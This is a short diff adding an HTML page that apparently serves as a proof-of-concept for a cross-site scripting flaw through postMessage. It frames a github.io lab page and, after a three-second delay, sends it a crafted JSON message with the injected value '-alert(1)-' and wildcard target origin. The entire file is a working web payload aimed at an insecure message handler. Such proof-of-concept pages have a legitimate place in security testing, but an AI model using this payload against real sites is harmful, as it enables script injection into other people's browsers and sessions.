@@ -1,0 +1,14 @@
+<html>
+<body>
+<iframe id="a" onload="func()" src="https://r0hanSH.github.io/okoklab/a.html" >
+</iframe>
+
+<script>
+function func(){
+setTimeout( function() {document.getElementById("a").contentWindow.postMessage('{"data":{"vl_disable_tracking": "2","s": "-alert(1)-"}', "*");}, 3000);
+}
+</script>
+
+
+</body>
+</html>
